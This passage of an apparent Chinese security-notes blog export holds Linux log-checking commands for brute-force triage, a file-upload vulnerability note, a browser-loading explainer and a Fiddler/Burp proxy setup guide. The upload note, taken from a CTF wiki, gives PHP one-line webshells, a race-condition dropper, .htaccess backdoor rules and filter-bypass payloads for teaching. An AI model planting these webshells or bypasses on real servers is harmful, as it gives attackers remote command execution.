<h2 id="日志检查"><a href="#日志检查" class="headerlink" title="日志检查"></a>日志检查</h2><table>
<thead>
<tr>
<th align="center">日志文件</th>
<th align="center">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="center">&#x2F;var&#x2F;log&#x2F;cron</td>
<td align="center">记录了系统定时任务相关的日志</td>
</tr>
<tr>
<td align="center">&#x2F;var&#x2F;log&#x2F;cups</td>
<td align="center">记录打印信息的日志</td>
</tr>
<tr>
<td align="center">&#x2F;var&#x2F;log&#x2F;dmesg</td>
<td align="center">记录了系统在开机时内核自检的信息，也可以使用dmesg命令直接查看内核自检信息</td>
</tr>
<tr>
<td align="center">&#x2F;var&#x2F;log&#x2F;mailog</td>
<td align="center">记录邮件信息</td>
</tr>
<tr>
<td align="center">&#x2F;var&#x2F;log&#x2F;message</td>
<td align="center">记录系统重要信息的日志。这个日志文件中会记录Linux系统的绝大多数重要信息，如果系统出现问题时，首先要检查的就应该是这个日志文件</td>
</tr>
<tr>
<td align="center">&#x2F;var&#x2F;log&#x2F;btmp</td>
<td align="center">记录错误登录日志，这个文件是二进制文件，不能直接vi查看，而要使用lastb命令查看</td>
</tr>
<tr>
<td align="center">&#x2F;var&#x2F;log&#x2F;lastlog</td>
<td align="center">记录系统中所有用户最后一次登录时间的日志，这个文件是二进制文件，不能直接vi，而要使用lastlog命令查看</td>
</tr>
<tr>
<td align="center">&#x2F;var&#x2F;log&#x2F;wtmp</td>
<td align="center">永久记录所有用户的登录、注销信息，同时记录系统的启动、重启、关机事件。同样这个文件也是一个二进制文件，不能直接vi，而需要使用last命令来查看</td>
</tr>
<tr>
<td align="center">&#x2F;var&#x2F;log&#x2F;utmp</td>
<td align="center">记录当前已经登录的用户信息，这个文件会随着用户的登录和注销不断变化，只记录当前登录用户的信息。同样这个文件不能直接vi，而要使用w,who,users等命令来查询</td>
</tr>
<tr>
<td align="center">&#x2F;var&#x2F;log&#x2F;secure</td>
<td align="center">记录验证和授权方面的信息，只要涉及账号和密码的程序都会记录，比如SSH登录，su切换用户，sudo授权，甚至添加用户和修改用户密码都会记录在这个日志文件中</td>
</tr>
</tbody></table>
<p>爆破主机的root帐号的IP数量：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">grep &quot;Failed password for root&quot; /var/log/secure | awk &#x27;&#123;print $11&#125;&#x27; | sort | uniq -c | sort -nr | more</span><br></pre></td></tr></table></figure>
<p>定位爆破的IP：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">grep &quot;Failed password&quot; /var/log/secure|grep -E -o &quot;(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)&quot;|uniq -c</span><br></pre></td></tr></table></figure>
<p>爆破用户名的字典</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">grep &quot;Failed password&quot; /var/log/secure|perl -e &#x27;while($_=&lt;&gt;)&#123; /for(.*?) from/; print &quot;$1\n&quot;;&#125;&#x27;|uniq -c|sort -nr</span><br><span class="line">2、登录成功的IP 	</span><br><span class="line">grep &quot;Accepted &quot; /var/log/secure | awk &#x27;&#123;print $11&#125;&#x27; | sort | uniq -c | sort -nr | more</span><br></pre></td></tr></table></figure>
<p>登录成功的日期、用户名、IP：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">grep &quot;Accepted &quot; /var/log/secure | awk &#x27;&#123;print $1,$2,$3,$9,$11&#125;&#x27;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>应急响应</category>
      </categories>
      <tags>
        <tag>应急响应流程</tag>
      </tags>
  </entry>
  <entry>
    <title>文件上传知识记录</title>
    <url>/posts/bbd26fac.html</url>
    <content><![CDATA[<h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><div class="note info no-icon flat"><p>一些web应用程序中允许上传图片、视频、头像和许多其他类型的文件到服务器中。<br>文件上传漏洞就是利用服务端代码对文件上传路径变量过滤不严格将可执行的文件上传到一个到服务器中 ，再通过URL去访问以执行恶意代码。</p>
</div>

<h1 id="危害"><a href="#危害" class="headerlink" title="危害"></a>危害</h1><div class="note info no-icon flat"><p>非法用户可以利用上传的恶意脚本文件控制整个网站，甚至控制服务器。这个恶意的脚本文件，又被称为WebShell，也可以将WebShell脚本称为一种网页后门，WebShell脚本具有非常强大的功能，比如查看服务器目录、服务器中的文件，执行系统命令等。</p>
</div>

<h1 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h1><div class="note info no-icon flat"><p>文件扩展名服务端白名单效验<br>文件内容服务端效验<br>上传文件重命名<br>隐藏上传文件路径<br>限制相关目录的执行权限，防范WebShell攻击</p>
</div>

<h1 id="检测与绕过"><a href="#检测与绕过" class="headerlink" title="检测与绕过"></a>检测与绕过</h1><h2 id="无验证"><a href="#无验证" class="headerlink" title="无验证"></a>无验证</h2><div class="note info no-icon flat"><p>直接上传一句话木马或者WebShell脚本即可。</p>
</div>

<h2 id="客户端检测（Js检测）"><a href="#客户端检测（Js检测）" class="headerlink" title="客户端检测（Js检测）"></a>客户端检测（Js检测）</h2><div class="note info no-icon flat"><p>在网页上写一段Javascript脚本，效验文件上传的后缀名，有白名单形式也有黑名单形式。如果上传文件的后缀不被允许，则会弹窗告知，此时文件上传的数据包并没有发送到服务端，只是在客户端浏览器使用Javascript对数据包进行检测。</p>
<p>这时有两种方法可以绕过客户端Javascript的检测：<br>使用浏览器插件，删除检测文件后缀的Javascript代码，然后上传文件即可绕过<br>首先把需要上传的文件后缀改成允许上传的文件类型，如jpg、png、gif等，绕过Javascript检测，再抓包，把后缀名改成可执行文件的后缀即可上传成功</p>
</div>

<h2 id="服务端检测（MINE检测）"><a href="#服务端检测（MINE检测）" class="headerlink" title="服务端检测（MINE检测）"></a>服务端检测（MINE检测）</h2><div class="note info no-icon flat"><p>MIME (Multipurpose Internet Mail Extensions) 是描述消息内容类型的因特网标准。<br>服务器代码判断$_FILES[”file“][“type”]是不是图片格式（image&#x2F;jpeg、image&#x2F;png、image&#x2F;gif），如果不是，则不允许上传该文件。</p>
<p>绕过方法：<br>抓包后更改Content-Type为允许的类型绕过该代码限制，比如将php文件的Content-Type:application&#x2F;octet-stream修改为image&#x2F;jpeg、image&#x2F;png、image&#x2F;gif等<br>常见MIMETYPE修改<br>audio&#x2F;mpeg -&gt; .mp3 application&#x2F;msword -&gt; .doc application&#x2F;octet-stream -&gt; .exe application&#x2F;pdf -&gt; .pdf application&#x2F;x-javascript -&gt; .js application&#x2F;x-rar -&gt; .rar application&#x2F;zip -&gt; .zip image&#x2F;gif -&gt; .gif image&#x2F;jpeg -&gt; .jpg &#x2F; .jpeg image&#x2F;png -&gt; .png text&#x2F;plain -&gt; .txt text&#x2F;html -&gt; .html video&#x2F;mp4 -&gt; .mp4</p>
</div>

<h2 id="服务端检测（目录路径检测）"><a href="#服务端检测（目录路径检测）" class="headerlink" title="服务端检测（目录路径检测）"></a>服务端检测（目录路径检测）</h2><div class="note info no-icon flat"><p>对目录路径的检测不够严谨而导致可以使用%00截断绕过进行攻击。</p>
<p>绕过方法:<br>例如：&#x2F;111.php%00.gif&#x2F;111.gif -&gt; &#x2F;111.php</p>
</div>

<h2 id="服务端检测（文件扩展名检测）"><a href="#服务端检测（文件扩展名检测）" class="headerlink" title="服务端检测（文件扩展名检测）"></a>服务端检测（文件扩展名检测）</h2><div class="note info no-icon flat"><p>文件名大小写绕过，如：*.pHp <em>.aSP<br>文件名双写绕过，如：</em>.pphphp<br>Unicode： 当目标存在json_decode且检查在json_decode之前,可以将php写为\u0070hp<br>名单列表绕过，如：*.asa <em>.cer<br>特殊文件名绕过，比如windows文件名最后不能有.或空格，可设为</em>.php.或*.php+<br>0x00截断绕过，比如：*.php(0x00).jpg 或 *.php%00.jpg<br>文件包含漏洞<br>服务器解析漏洞<br>.htaccess文件攻击</p>
</div>

<h2 id="文件截断绕过攻击"><a href="#文件截断绕过攻击" class="headerlink" title="文件截断绕过攻击"></a>文件截断绕过攻击</h2><div class="note info no-icon flat"><p>截断类型：PHP%00截断<br>截断原理：由于00代表结束符，所以会把00后面的所有字符删除<br>截断条件：PHP版本小于5.3.4，PHP的magic_quotes_gpc为OFF状态<br>绕过方法：例如上传文件shell.php，上传文件路径为&#x2F;?upload&#x3D;shell.php  绕过：&#x2F;?upload&#x3D;shell.php%00.jpg -&gt; &#x2F;?upload&#x3D;shell.php</p>
</div>

<h2 id="解析漏洞攻击"><a href="#解析漏洞攻击" class="headerlink" title="解析漏洞攻击"></a>解析漏洞攻击</h2><div class="note info no-icon flat"><p>主要有目录解析、文件解析，Apache解析漏洞、Nginx解析漏洞、IIS7.5解析漏洞。</p>
</div>

<h3 id="目录解析"><a href="#目录解析" class="headerlink" title="目录解析"></a>目录解析</h3><div class="note info no-icon flat"><p>形式：<a href="http://www.xxx.com/xxx.asp/xxx.jpg">www.xxx.com/xxx.asp/xxx.jpg</a><br>原理：服务器会默认把 .asp 和 .asp目录下的文件都解析成asp文件</p>
</div>

<h3 id="文件解析"><a href="#文件解析" class="headerlink" title="文件解析"></a>文件解析</h3><div class="note info no-icon flat"><p>形式：<a href="http://www.xxx.com/xxx.asp;.jpg">www.xxx.com/xxx.asp;.jpg</a><br>原理：服务器默认不解析;后面的内容，因此xxx.asp;jpg被解析为xxx.asp文件了</p>
</div>

<h3 id="apache解析"><a href="#apache解析" class="headerlink" title="apache解析"></a>apache解析</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AddType application/x-httpd-php .php .phtml</span><br></pre></td></tr></table></figure>
<div class="note info no-icon flat"><p>常用后缀：*.php *.php3 *.php4 *.php5 *.phtml *.pht</p>
<p>在Apache的解析顺序中，是从右到左开始解析文件后缀的，如果最右侧的扩展名不可识别，就继续往左判断，直到遇到可以解析的文件后缀为止。因此，例如上传的文件名为1.php.xxxx，因为后缀xxxx不可解析，所以向左解析后缀php。</p>
<p>例如：shell.php.qwe.asd -&gt;shell.php</p>
</div>

<h3 id="nginx解析"><a href="#nginx解析" class="headerlink" title="nginx解析"></a>nginx解析</h3><div class="note info no-icon flat"><p>Nginx默认是以CGI的方式支持PHP解析的，普遍的做法是在Nginx配置文件中通过 正则匹配设置SCRIPT_FILENAME。当访问<a href="http://www.xxx.com/phpinfo.jpg/1.php%E8%BF%99%E4%B8%AA">www.xxx.com/phpinfo.jpg/1.php这个</a> URL时，$fastcgi_script_name会被设置为“phpinfo.jpg&#x2F;1.php”，然后构造成 SCRIPT_FILENAME传递给PHP CGI。</p>
<p>原因是开启了 fix_pathinfo 这个选项，会触发 在PHP中的如下逻辑： PHP会认为SCRIPT_FILENAME是phpinfo.jpg，而1.php是PATH_INFO，所以就会 将phpinfo.jpg作为PHP文件来解析了。</p>
</div>
<div class="note info no-icon flat"><p>攻击方式<br>形式：<br><a href="http://www.xxxx.com/UploadFiles/image/1.jpg/1.php">www.xxxx.com/UploadFiles/image/1.jpg/1.php</a><br><a href="http://www.xxxx.com/UploadFiles/image/1.jpg%00.php">www.xxxx.com/UploadFiles/image/1.jpg%00.php</a><br><a href="http://www.xxxx.com/UploadFiles/image/1.jpg/%20/0.php">www.xxxx.com/UploadFiles/image/1.jpg/%20\0.php</a><br>另一种方法：上传一个名字为test.jpg，然后访问test.jpg&#x2F;.php,在这个目录下就会生成一句话木马shell.php。</p>
</div>

<h2 id="竞争条件攻击"><a href="#竞争条件攻击" class="headerlink" title="竞争条件攻击"></a>竞争条件攻击</h2><div class="note info no-icon flat"><p>一些网站上传文件的逻辑时先允许上传任意文件，然后检查上传文件的文件是否包含WebShell脚本，如果包含则删除该文件。这里存在的问题是文件上传成功后和删除文件之间存在一个短暂的时间差（因为需要执行检查文件和删除文件的操作），攻击者可以利用这个时间差完成竞争条件的上传漏洞攻击。</p>
</div>
<div class="note info no-icon flat"><p>攻击方法：<br>攻击者需要先上传一个WebShell脚本1.php，1.php的内容为生成一个新的WebShell脚本shell.php，1.php写入如下代码</p>
</div>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	fputs(fopen(&quot;../shell.php&quot;, &quot;w&quot;),&#x27;&lt;?php @eval($_POST[&#x27;cmd&#x27;]); ?&gt;&#x27;);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<div class="note info no-icon flat"><p>当1.php上传完成后，客户端立即访问1.php，则会在服务端当前目录下自动生成shell.php，这时攻击者就利用了时间差完成了WebShell的上传</p>
</div>

<h2 id="双文件上传"><a href="#双文件上传" class="headerlink" title="双文件上传"></a>双文件上传</h2><div class="note info no-icon flat"><p>本意为上传两个或多个文件去突破。上传点支持多文件上传，但是却只对第一个文件做了过滤。</p>
<p>利用方式：</p>
<p>在存在双文件上传漏洞的页面中，查看上传的页面。F12找到上传的post表单，action属性是指定上传检测页面，一般是写的绝对路径，比如：xxx.asp&#x2F;xxx.php<br>补全url：<a href="https://www.xxx.com/xxx.php(asp)">https://www.xxx.com/xxx.php(asp)</a><br>构造本地post提交表单</p>
</div>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;form action=&quot;https://www.xxx.com/xxx.asp(php)&quot; method=&quot;post&quot;</span><br><span class="line">name=&quot;form1&quot; enctype=&quot;multipart/form‐data&quot;&gt;</span><br><span class="line">&lt;input name=&quot;FileName1&quot; type=&quot;FILE&quot; class=&quot;tx1&quot; size=&quot;40&quot;&gt;</span><br><span class="line">&lt;input name=&quot;FileName2&quot; type=&quot;FILE&quot; class=&quot;tx1&quot; size=&quot;40&quot;&gt;</span><br><span class="line">&lt;input type=&quot;submit&quot; name=&quot;Submit&quot; value=&quot;上传&quot;&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure>
<div class="note info no-icon flat"><p>利用时只需要修改action的值为指定上传页面即可<br>第一个文件上传允许的文件类型（.jpg .png .gif 等），第二个上传文件是一句话木马或者WebShell脚本。这样就可以突破上传限制，成功上传木马到服务器。</p>
</div>

<h2 id="php3457"><a href="#php3457" class="headerlink" title="php3457"></a>php3457</h2><div class="note info no-icon flat"><p>该项为apache专属。关键点在&#x2F;etc&#x2F;apache2&#x2F;mods-available&#x2F;php5.6.conf这个文件，满足.+.ph(p[3457]?|t|tml)$，都会被当作php文件解析。<br>在apache2目录下grep -r x-httpd-php &#x2F;etc&#x2F;apache2找到对应文件就能知道解析哪些后缀。</p>
</div>

<h2 id="htaccess攻击"><a href="#htaccess攻击" class="headerlink" title=".htaccess攻击"></a>.htaccess攻击</h2><div class="note info no-icon flat"><p>.htaccess文件(或者”分布式配置文件”）提供了针对目录改变配置的方法， 即，在一个特定的文档目录中放置一个包含一个或多个指令的文件， 以作用于此目录及其所有子目录。作为用户，所能使用的命令受到限制。管理员可以通过Apache的AllowOverride指令来设置。<br>概述来说，htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以帮我们实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许&#x2F;阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能。<br>启用.htaccess，需要修改httpd.conf，启用AllowOverride，并可以用AllowOverride限制特定命令的使用。如果需要使用.htaccess以外的其他文件名，可以用AccessFileName指令来改变。例如，需要使用.config ，则可以在服务器配置文件中按以下方法配置：AccessFileName .config 。<br>笼统地说，.htaccess可以帮我们实现包括：文件夹密码保护、用户自动重定向、自定义错误页面、改变你的文件扩展名、封禁特定IP地址的用户、只允许特定IP地址的用户、禁止目录列表，以及使用其他文件作为index文件等一些功能。<br>一般.htaccess可以用来留后门和针对黑名单绕过。在上传网站的根目录下，上传一个.htaccess文件即可。</p>
<p>绕过方法：<br>针对黑名单绕过<br>创建一个txt文件，写入</p>
</div>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AddType  application/x-httpd-php    .png</span><br></pre></td></tr></table></figure>
<div class="note info no-icon flat"><p>另存为 .htaccess 名称，保存类型为所有文件，即可将png文件解析为php文件。</p>
<p>留后门<br>在.htaccess 内写入php解析规则，类似于把文件名包含s的解析成php文件</p>
</div>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;FilesMatch &quot;s&quot;&gt;</span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure>
<div class="note info no-icon flat"><p>shell.png 就会以php文件执行</p>
<p>利用.htaccess进行文件包含</p>
</div>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php_value auto_prepend_file &quot;.htaccess&quot;</span><br><span class="line">#&lt;?php eval($_POST[cmd]);?&gt;</span><br></pre></td></tr></table></figure>
<div class="note info no-icon flat"><p>使用#注释使得.htaccess能够成功解析</p>
</div>

<h2 id="服务器检测（文件内容检测）"><a href="#服务器检测（文件内容检测）" class="headerlink" title="服务器检测（文件内容检测）"></a>服务器检测（文件内容检测）</h2><div class="note info no-icon flat"></div>

<h3 id="文件幻术检测"><a href="#文件幻术检测" class="headerlink" title="文件幻术检测"></a>文件幻术检测</h3><div class="note info no-icon flat"><p>文件幻数检测（文件开头）<br>幻数 magic number，它可以用来标记文件或者协议的格式，很多文件都有幻数标志来表明该文件的格式。</p>
<p>要绕过文件幻数检测就要在文件开头写上如下的值</p>
</div>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.jpg	FF D8 FF E0 00 10 4A 46 49 46</span><br><span class="line">.gif	47 49 46 38 39 61</span><br><span class="line">.png	89 50 4E 47</span><br></pre></td></tr></table></figure>
<div class="note info no-icon flat"><p>在文件幻数后面加上自己的WebShell代码就行</p>
<p>文件相关信息检测<br>图像文件相关信息检测常用的是getimagesize()函数，需要把文件头部分伪造，也就是在幻数的基础上还加了一些文件信息。</p>
<p>例如下面结构</p>
</div>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">(...some binary data for image...)</span><br><span class="line">&lt;?php phpinfo(); ?&gt;</span><br><span class="line">(... skipping the rest of binary data ...)</span><br></pre></td></tr></table></figure>
<div class="note info no-icon flat"><p>另一种是判断是否包含&lt;?或者php<br>绕过&lt;?：</p>
</div>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script language=&#x27;php&#x27;&gt;@eval($_POST[cmd]);&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<div class="note info no-icon flat"><p>绕过php：</p>
</div>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?= @eval($_POST[&#x27;cmd&#x27;]);?&gt;</span><br></pre></td></tr></table></figure>
<div class="note info no-icon flat"><p>绕过方法：</p>
<p>对渲染&#x2F;加载测试的攻击方式是代码注入绕过。使用winhex在不破坏文件本身的渲染情况下找一个空白区进行填充代码，一般为图片的注释区。<br>对二次渲染的攻击方式就是攻击文件加载器自身。例如：</p>
<p>上传文件数据不完整的gif文件 -&gt; 触发报错imagecreatefromgif()函数<br>上传文件数据不完整的png文件 -&gt; 触发报错imagecreatefrompng()函数</p>
</div>
<div class="note info no-icon flat"><p>某后台调用GD库对图像进行二次渲染的代码</p>
</div>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function image_gd_open($file, $extension)</span><br><span class="line">&#123;</span><br><span class="line">$extension = str_replace(&#x27;jpg&#x27;, &#x27;jpeg&#x27;, $extension);</span><br><span class="line">$open_func = &#x27;imageCreateFrom&#x27;. $extension; //函数名变成imageCreateFrompng 之类</span><br><span class="line">if (!function_exists($open_func))</span><br><span class="line">&#123;</span><br><span class="line">	return FALSE;</span><br><span class="line">&#125;</span><br><span class="line">return $open_func($file); //变成imagecreatefrompng(&#x27;/tmp/phpimage&#x27;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<div class="note info no-icon flat"><p>对文件加载器进行攻击，常见的就是溢出攻击。上传自己的恶意文件后，服务器上的文件加载器会主动进行加载测试，加载测试时被溢出攻击执行shellcode，比如access&#x2F;mdb溢出。</p>
</div>

<p>搬运自<a href="https://wiki.wgpsec.org/knowledge/ctf/uploadfile.html">https://wiki.wgpsec.org/knowledge/ctf/uploadfile.html</a></p>
]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>文件上传</tag>
      </tags>
  </entry>
  <entry>
    <title>浏览器加载流程</title>
    <url>/posts/1c025fc.html</url>
    <content><![CDATA[<p>摘: <a href="https://www.cnblogs.com/ryanzheng/p/18284643">https://www.cnblogs.com/ryanzheng/p/18284643</a></p>
<h1 id="用户输入"><a href="#用户输入" class="headerlink" title="用户输入"></a>用户输入</h1><p>用户访问URL: <a href="https://example.com/index/about?query=1">https://example.com/index/about?query=1</a></p>
<h1 id="浏览器解析"><a href="#浏览器解析" class="headerlink" title="浏览器解析"></a>浏览器解析</h1><p>提取访问URL的协议(https),域名(example.com),路径(&#x2F;index&#x2F;about)和查询参数(query)</p>
<h1 id="检查缓存"><a href="#检查缓存" class="headerlink" title="检查缓存"></a>检查缓存</h1><p>检查本地缓存是否有该域名的ip地址,如果有则使用缓存的ip地址</p>
<h1 id="DNS解析"><a href="#DNS解析" class="headerlink" title="DNS解析"></a>DNS解析</h1><h2 id="什么是DNS缓存"><a href="#什么是DNS缓存" class="headerlink" title="什么是DNS缓存"></a>什么是DNS缓存</h2><p>在域名系统 (DNS) 中，缓存是在操作系统、浏览器、设备或网络中临时存储 DNS 记录的过程<br>DNS 记录用于将人类可读的域名(例如,example.com)转换为计算机和设备可以理解的对应 IP 地址，例如 2001:db8:3e8:2a3::b63<br>通过在本地存储 DNS 信息,DNS 缓存使域名能够更快地被转换或”解析”，同时可以减少网络流量</p>
<h2 id="DNS缓存顺序"><a href="#DNS缓存顺序" class="headerlink" title="DNS缓存顺序"></a>DNS缓存顺序</h2><p>浏览器缓存:浏览器检查缓存是否有该域名ip地址<br>操作系统缓存:如若浏览器没有,浏览器向操作系统查询<br>本地dns服务器:操作系统缓存没有,则向配置的本地dns服务器发送查询请求<br>递归查询:本地 DNS 服务器会递归查询其他 DNS 服务器，直到找到该域名对应的 IP 地址<br>返回结果:DNS 服务器将结果返回给操作系统，再由操作系统返回给浏览器</p>
<h1 id="建立连接"><a href="#建立连接" class="headerlink" title="建立连接"></a>建立连接</h1><h2 id="三次握手-TCP连接"><a href="#三次握手-TCP连接" class="headerlink" title="三次握手(TCP连接)"></a>三次握手(TCP连接)</h2><p>SYN:客户端发送至服务端请求连接<br>SYN-ACK:服务端收到回复确认表示同意连接<br>ACK:客户端确认回复并建立连接</p>
<h2 id="TLS-SSL握手-HTTPS"><a href="#TLS-SSL握手-HTTPS" class="headerlink" title="TLS&#x2F;SSL握手(HTTPS)"></a>TLS&#x2F;SSL握手(HTTPS)</h2><p>客户端问候:客户端发送一个 ClientHello 消息,包含支持的加密算法、TLS 版本等信息<br>服务器问候:服务器回复一个 ServerHello 消息,选择加密算法和 TLS 版本,并发送服务器证书<br>证书验证:客户端验证服务器证书的有效性<br>密钥交换:客户端生成一个随机数,用服务器的公钥加密后发送给服务器，服务器用私钥解密，生成会话密钥<br>完成握手:双方使用会话密钥加密通信,握手完成</p>
<h1 id="发送HTTP请求"><a href="#发送HTTP请求" class="headerlink" title="发送HTTP请求"></a>发送HTTP请求</h1><h2 id="构建请求"><a href="#构建请求" class="headerlink" title="构建请求"></a>构建请求</h2><p>浏览器构建一个 HTTP 请求，包括请求行(如 GET&#x2F;HTTP&#x2F;1.1)、请求头(如 Host: <a href="http://www.example.com)和可选的请求体/">www.example.com)和可选的请求体</a>(如 POST 请求的数据)</p>
<h2 id="发送请求"><a href="#发送请求" class="headerlink" title="发送请求"></a>发送请求</h2><p>浏览器通过建立的 TCP 连接将 HTTP 请求发送到服务器</p>
<h1 id="服务器处理请求"><a href="#服务器处理请求" class="headerlink" title="服务器处理请求"></a>服务器处理请求</h1><p>接收请求：服务器接收到 HTTP 请求<br>请求解析：服务器解析请求行、请求头和请求体<br>路由处理：服务器根据请求的路径和参数，确定处理请求的逻辑<br>业务逻辑：服务器执行相应的业务逻辑，可能涉及读取文件、查询数据库、调用其他服务等<br>生成响应：服务器生成一个 HTTP 响应，包括状态行(如 HTTP&#x2F;1.1 200 OK)、响应头(如 Content-Type: text&#x2F;html)和响应体(如 HTML 内容)</p>
<h1 id="浏览器接收响应"><a href="#浏览器接收响应" class="headerlink" title="浏览器接收响应"></a>浏览器接收响应</h1><p>接收响应<br>浏览器接收服务器响应<br>解析响应<br>浏览器解析响应头和响应体</p>
<h1 id="页面渲染"><a href="#页面渲染" class="headerlink" title="页面渲染"></a>页面渲染</h1><h2 id="解析html"><a href="#解析html" class="headerlink" title="解析html"></a>解析html</h2><p>构建DOM树 解析HTML文档，构建DOM树<br>处理脚本 遇到&lt; script &gt;标签浏览器会暂停解析，执行脚本，脚本可能修改DOM树</p>
<h2 id="解析css"><a href="#解析css" class="headerlink" title="解析css"></a>解析css</h2><p>构建CSSOM树 解析css文件和内联样式，构建css object model树</p>
<h2 id="解析javascript"><a href="#解析javascript" class="headerlink" title="解析javascript"></a>解析javascript</h2><p>执行脚本 解析和执行JavaScript代码，可能修改dom树和cssom树</p>
<h2 id="构建渲染树"><a href="#构建渲染树" class="headerlink" title="构建渲染树"></a>构建渲染树</h2><p>结合dom和cssom</p>
<h2 id="布局"><a href="#布局" class="headerlink" title="布局"></a>布局</h2><p>计算布局 计算每个元素的大小和位置</p>
<h2 id="绘制"><a href="#绘制" class="headerlink" title="绘制"></a>绘制</h2><p>绘制元素 浏览器绘制到屏幕上</p>
<h1 id="处理资源请求"><a href="#处理资源请求" class="headerlink" title="处理资源请求"></a>处理资源请求</h1><p>发现资源：在解析 HTML 的过程中，浏览器会发现需要加载的资源(如图片、CSS 文件、JavaScript 文件等)<br>发送请求：浏览器会并行发送请求，加载这些资源<br>重复解析和渲染：浏览器重复上述的解析和渲染过程，直到所有资源加载完成</p>
<h1 id="用户交互"><a href="#用户交互" class="headerlink" title="用户交互"></a>用户交互</h1><p>用户操作:页面加载完成后，用户可以与页面进行交互(如点击按钮、输入表单等)<br>事件处理:浏览器会根据用户的操作,触发相应的事件处理程序,更新页面内容</p>
]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>网络请求</tag>
      </tags>
  </entry>
  <entry>
    <title>fiddler everywhere联动burpsuite抓取模拟器流量包</title>
    <url>/posts/67df5e74.html</url>
    <content><![CDATA[<h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><p>fiddler everywhere 5.10<br>burpsuite professional v2024.3.1<br>mumu模拟器12</p>
<h1 id="fiddler-配置"><a href="#fiddler-配置" class="headerlink" title="fiddler 配置"></a>fiddler 配置</h1><h2 id="开启https抓包"><a href="#开启https抓包" class="headerlink" title="开启https抓包"></a>开启https抓包</h2><p>进入fiddler主页的右上角设置-&gt;HTTPS-&gt;信任CA证书-&gt;勾选捕获https流量和忽略服务器证书错误<br><img src="/img/postimg/simulatorcatche/https.png"></p>
<h2 id="fiddler-代理端口设置"><a href="#fiddler-代理端口设置" class="headerlink" title="fiddler 代理端口设置"></a>fiddler 代理端口设置</h2><p>设置监听端口8848，启用http&#x2F;2支持；若启用允许远程计算设备连接，其他外设可以通过代理到这台设备以ip+port的方式进行抓包。<br><img src="/img/postimg/simulatorcatche/fiddlerportproxy.png"></p>
<h2 id="fiddler配置端口转发至burpsuite"><a href="#fiddler配置端口转发至burpsuite" class="headerlink" title="fiddler配置端口转发至burpsuite"></a>fiddler配置端口转发至burpsuite</h2><p>设置-&gt;gateway-&gt;设置burpsuite监听的端口和ip<br><img src="/img/postimg/simulatorcatche/gateway.png"></p>
<h2 id="（非必须）导出证书至桌面"><a href="#（非必须）导出证书至桌面" class="headerlink" title="（非必须）导出证书至桌面"></a>（非必须）导出证书至桌面</h2><p>此步骤可忽略，若浏览器需要证书可进行该步骤并于浏览器内导入<br>高级设置-&gt;导出证书至桌面<br><img src="/img/postimg/simulatorcatche/exportfiddlerca.png"></p>
<h1 id="模拟器配置"><a href="#模拟器配置" class="headerlink" title="模拟器配置"></a>模拟器配置</h1><h2 id="查看本机ip"><a href="#查看本机ip" class="headerlink" title="查看本机ip"></a>查看本机ip</h2><p>win+R 输入 cmd后确定，在终端输入 ipconfig<br><img src="/img/postimg/simulatorcatche/ipconfig.png"></p>
<h2 id="模拟器配置代理-ip-port"><a href="#模拟器配置代理-ip-port" class="headerlink" title="模拟器配置代理 ip + port"></a>模拟器配置代理 ip + port</h2><p>模拟器下拉，长按网络进入网络设置，点击网络，并于右上角配置<br><img src="/img/postimg/simulatorcatche/simulatorproxy.png"></p>
<h2 id="模拟器下载并安装证书"><a href="#模拟器下载并安装证书" class="headerlink" title="模拟器下载并安装证书"></a>模拟器下载并安装证书</h2><p>模拟器内的浏览器访问ip+port并下载证书<br><img src="/img/postimg/simulatorcatche/downloadca.png"><br>网络设置-&gt;网络偏好设置-&gt;安装证书<br><img src="/img/postimg/simulatorcatche/importca.png"></p>
<h1 id="burpsuite配置"><a href="#burpsuite配置" class="headerlink" title="burpsuite配置"></a>burpsuite配置</h1><p>打开bp代理设置<br><img src="/img/postimg/simulatorcatche/bpproxy.png"><br>添加监听ip和port<br><img src="/img/postimg/simulatorcatche/bpaddipport.png"></p>
